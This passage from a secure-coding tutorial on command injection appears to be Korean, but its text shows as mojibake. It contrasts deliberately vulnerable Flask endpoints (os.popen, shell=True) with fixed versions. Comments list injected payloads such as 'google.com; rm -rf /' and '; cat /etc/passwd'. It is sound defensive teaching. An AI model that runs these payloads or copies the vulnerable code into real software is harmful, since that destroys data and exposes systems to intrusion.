<p>Command injectionì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‚¬ìš©ì ì…ë ¥ì„ ì‹œìŠ¤í…œ ì…¸ ëª…ë ¹ìœ¼ë¡œ ì „ë‹¬í•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì…¸ ë©”íƒ€ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ ì¶”ê°€ ëª…ë ¹ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="n">â”‚</span><span class="w">              </span><span class="n">Command</span><span class="w"> </span><span class="n">Injection</span><span class="w">                                   </span><span class="n">â”‚</span>
<span class="n">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì• í”Œë¦¬ì¼€ì´ì…˜</span><span class="w"> </span><span class="n">ì˜ë„</span><span class="o">:</span><span class="w">                                               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="w">                                            </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ê³µê²©ì</span><span class="w"> </span><span class="n">ì œê³µ</span><span class="o">:</span><span class="w">                                                     </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">                                     </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì‹¤í–‰ëœ</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="o">:</span><span class="w">                                                     </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">                          </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w">  </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w">                       </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì˜ë„ëœ</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w">              </span><span class="n">ì£¼ì…ëœ</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w">                             </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì…¸</span><span class="w"> </span><span class="n">ë©”íƒ€ë¬¸ì</span><span class="o">:</span><span class="w">                                                     </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="p">;</span><span class="w">    </span><span class="n">â†’</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w"> </span><span class="n">êµ¬ë¶„ì</span><span class="w"> </span><span class="p">(</span><span class="n">ë‘</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w"> </span><span class="n">ëª¨ë‘</span><span class="w"> </span><span class="n">ì‹¤í–‰</span><span class="p">)</span><span class="w">                          </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">&amp;&amp;</span><span class="w">   </span><span class="n">â†’</span><span class="w"> </span><span class="n">ì²«</span><span class="w"> </span><span class="n">ë²ˆì§¸ê°€</span><span class="w"> </span><span class="n">ì„±ê³µí•˜ë©´</span><span class="w"> </span><span class="n">ë‘</span><span class="w"> </span><span class="n">ë²ˆì§¸</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w"> </span><span class="n">ì‹¤í–‰</span><span class="w">                      </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">||</span><span class="w">   </span><span class="n">â†’</span><span class="w"> </span><span class="n">ì²«</span><span class="w"> </span><span class="n">ë²ˆì§¸ê°€</span><span class="w"> </span><span class="n">ì‹¤íŒ¨í•˜ë©´</span><span class="w"> </span><span class="n">ë‘</span><span class="w"> </span><span class="n">ë²ˆì§¸</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w"> </span><span class="n">ì‹¤í–‰</span><span class="w">                      </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">|</span><span class="w">    </span><span class="n">â†’</span><span class="w"> </span><span class="n">ì¶œë ¥ì„</span><span class="w"> </span><span class="n">ë‹¤ìŒ</span><span class="w"> </span><span class="n">ëª…ë ¹ìœ¼ë¡œ</span><span class="w"> </span><span class="n">íŒŒì´í”„</span><span class="w">                               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n n-Quoted">`cmd`</span><span class="n">â†’</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w"> </span><span class="n">ì¹˜í™˜</span><span class="w"> </span><span class="p">(</span><span class="n">ë°±í‹±</span><span class="p">)</span><span class="w">                                         </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">$</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="n">â†’</span><span class="w"> </span><span class="n">ëª…ë ¹</span><span class="w"> </span><span class="n">ì¹˜í™˜</span><span class="w">                                              </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">&gt;</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">â†’</span><span class="w"> </span><span class="n">ì¶œë ¥ì„</span><span class="w"> </span><span class="n">íŒŒì¼ë¡œ</span><span class="w"> </span><span class="n">ë¦¬ë””ë ‰ì…˜</span><span class="w">                                 </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">&lt;</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">â†’</span><span class="w"> </span><span class="n">íŒŒì¼ì—ì„œ</span><span class="w"> </span><span class="n">ì…ë ¥</span><span class="w"> </span><span class="n">ì½ê¸°</span><span class="w">                                     </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<h3 id="52">5.2 ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ<a class="header-link" href="#52" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">command_injection.py - Command injection ì·¨ì•½ì ê³¼ ë°©ì§€</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">shlex</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: ì‚¬ìš©ì ì…ë ¥ì´ ìˆëŠ” os.system</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ping-vulnerable&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ping_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì·¨ì•½: os.systemì„ í†µí•œ Command injection.&quot;&quot;&quot;</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span>

    <span class="c1"># ì ˆëŒ€ í•˜ì§€ ë§ ê²ƒ</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ping -c 4 </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">result</span><span class="p">})</span>

<span class="c1"># ê³µê²©: {&quot;host&quot;: &quot;google.com; cat /etc/passwd&quot;}</span>
<span class="c1"># ê³µê²©: {&quot;host&quot;: &quot;google.com; rm -rf /&quot;}</span>
<span class="c1"># ê³µê²©: {&quot;host&quot;: &quot;$(whoami)&quot;}</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/lookup-vulnerable&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">lookup_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì·¨ì•½: shell=Trueê°€ ìˆëŠ” subprocessë¥¼ í†µí•œ Command injection.&quot;&quot;&quot;</span>
    <span class="n">domain</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;domain&#39;</span><span class="p">]</span>

    <span class="c1"># shell=TrueëŠ” ì´ë¥¼ ì·¨ì•½í•˜ê²Œ ë§Œë“¦!</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;nslookup </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  <span class="c1"># ìœ„í—˜: ì…¸ ë©”íƒ€ë¬¸ì ì²˜ë¦¬ í™œì„±í™”</span>
        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">})</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ìˆ˜ì •: ì—¬ëŸ¬ ë°©ì–´ ê³„ì¸µ</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ping-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ping_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ìˆ˜ì •: ì•ˆì „í•œ ëª…ë ¹ ì‹¤í–‰.&quot;&quot;&quot;</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ë°©ì–´ 1: ì…ë ¥ ê²€ì¦ (í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9.\-]+$&#39;</span><span class="p">,</span> <span class="n">host</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid hostname&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># ë°©ì–´ 2: ê¸¸ì´ ì œí•œ</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">253</span><span class="p">:</span>  <span class="c1"># ìµœëŒ€ DNS ì´ë¦„ ê¸¸ì´</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Hostname too long&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># ë°©ì–´ 3: ë¦¬ìŠ¤íŠ¸ ì¸ìˆ˜ë¡œ subprocess ì‚¬ìš© (ì…¸ ì—†ìŒ)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
            <span class="p">[</span><span class="s2">&quot;ping&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">],</span>  <span class="c1"># ë¦¬ìŠ¤íŠ¸ í˜•ì‹: ì…¸ í•´ì„ ì—†ìŒ</span>
            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
            <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>  <span class="c1"># ì¤‘ë‹¨ ë°©ì§€</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">})</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Command timed out&quot;</span><span class="p">}),</span> <span class="mi">408</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/lookup-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">lookup_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ìˆ˜ì •: ì…¸ ëª…ë ¹ ëŒ€ì‹  ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©.&quot;&quot;&quot;</span>
    <span class="n">domain</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;domain&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ë°©ì–´ 1: ì…ë ¥ ê²€ì¦</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9.\-]+$&#39;</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid domain&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># ë°©ì–´ 2: ì…¸ ëª…ë ¹ ëŒ€ì‹  Python ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
        <span class="n">ips</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">result</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;domain&quot;</span><span class="p">:</span> <span class="n">domain</span><span class="p">,</span> <span class="s2">&quot;addresses&quot;</span><span class="p">:</span> <span class="n">ips</span><span class="p">})</span>
    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">gaierror</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;DNS resolution failed&quot;</span><span class="p">}),</span> <span class="mi">400</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/resize-image-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">resize_image_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ìˆ˜ì •: í”¼í•  ìˆ˜ ì—†ëŠ” ì…¸ ì‚¬ìš©ì„ ìœ„í•œ shlex.quoteì™€ ì•ˆì „í•œ ëª…ë ¹.&quot;&quot;&quot;</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">width</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;width&#39;</span><span class="p">,</span> <span class="mi">800</span><span class="p">)</span>

    <span class="c1"># íŒŒì¼ëª… ê²€ì¦ (ê²½ë¡œ íƒìƒ‰ ë°©ì§€)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid filename&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># width ê²€ì¦</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">width</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;=</span> <span class="n">width</span> <span class="o">&lt;=</span> <span class="mi">4096</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid width&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># ì…¸ì„ ë°˜ë“œì‹œ ì‚¬ìš©í•´ì•¼ í•œë‹¤ë©´ (ê°€ëŠ¥í•œ í”¼í•¨), shlex.quote ì‚¬ìš©</span>
    <span class="n">safe_filename</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    <span class="n">safe_width</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">width</span><span class="p">))</span>

    <span class="c1"># í•˜ì§€ë§Œ ë¦¬ìŠ¤íŠ¸ í˜•ì‹ ì„ í˜¸:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
        <span class="p">[</span><span class="s2">&quot;convert&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;uploads/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;-resize&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">safe_width</span><span class="si">}</span><span class="s2">x&quot;</span><span class="p">,</span>
         <span class="sa">f</span><span class="s2">&quot;resized/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">],</span>
        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Conversion failed&quot;</span><span class="p">}),</span> <span class="mi">500</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;resized&quot;</span><span class="p">})</span>
</code></pre></div>

<h3 id="53-command-injection">5.3 Command Injection ë°©ì§€ ê·œì¹™<a class="header-link" href="#53-command-injection" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="nx">Command</span><span class="w"> </span><span class="nx">Injection</span><span class="w"> </span><span class="nx">ë°©ì§€</span><span class="w">                                  </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="nx">ì…¸</span><span class="w"> </span><span class="nx">ëª…ë ¹</span><span class="w"> </span><span class="nx">ì™„ì „íˆ</span><span class="w"> </span><span class="nx">í”¼í•˜ê¸°</span><span class="w">                                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="nx">ëŒ€ì‹ </span><span class="w"> </span><span class="nx">Python</span><span class="w"> </span><span class="nx">ë¼ì´ë¸ŒëŸ¬ë¦¬</span><span class="w"> </span><span class="nx">ì‚¬ìš©</span><span class="p">:</span><span class="w">                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;ping X&quot;</span><span class="p">)</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">run</span><span class="p">([</span><span class="s">&quot;ping&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">X</span><span class="p">])</span><span class="w">       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;nslookup&quot;</span><span class="p">)</span><span class="err">â†’</span><span class="w"> </span><span class="nx">socket</span><span class="p">.</span><span class="nx">getaddrinfo</span><span class="p">()</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;convert&quot;</span><span class="p">)</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="nx">Pillow</span><span class="w"> </span><span class="nx">ë¼ì´ë¸ŒëŸ¬ë¦¬</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;curl&quot;</span><span class="p">)</span><span class="w">    </span><span class="err">â†’</span><span class="w"> </span><span class="nx">requests</span><span class="w"> </span><span class="nx">ë¼ì´ë¸ŒëŸ¬ë¦¬</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="nx">ì…¸ì´</span><span class="w"> </span><span class="nx">í”¼í• </span><span class="w"> </span><span class="nx">ìˆ˜</span><span class="w"> </span><span class="nx">ì—†ë‹¤ë©´</span><span class="p">:</span><span class="w">                                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ë¦¬ìŠ¤íŠ¸</span><span class="w"> </span><span class="nx">ì¸ìˆ˜ë¡œ</span><span class="w"> </span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">run</span><span class="p">()</span><span class="w"> </span><span class="nx">ì‚¬ìš©</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">shell</span><span class="p">=</span><span class="nx">True</span><span class="w"> </span><span class="nx">ì ˆëŒ€</span><span class="w"> </span><span class="nx">ì‚¬ìš©í•˜ì§€</span><span class="w"> </span><span class="nx">ì•Šê¸°</span><span class="w">                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ìµœí›„ì˜</span><span class="w"> </span><span class="nx">ìˆ˜ë‹¨ìœ¼ë¡œ</span><span class="w"> </span><span class="nx">shlex</span><span class="p">.</span><span class="nx">quote</span><span class="p">()</span><span class="w"> </span><span class="nx">ì‚¬ìš©</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">timeout</span><span class="w"> </span><span class="nx">ì„¤ì •</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="nx">ì…ë ¥</span><span class="w"> </span><span class="nx">ê²€ì¦</span><span class="p">:</span><span class="w">                                                   </span><span class="err">â”‚</span>
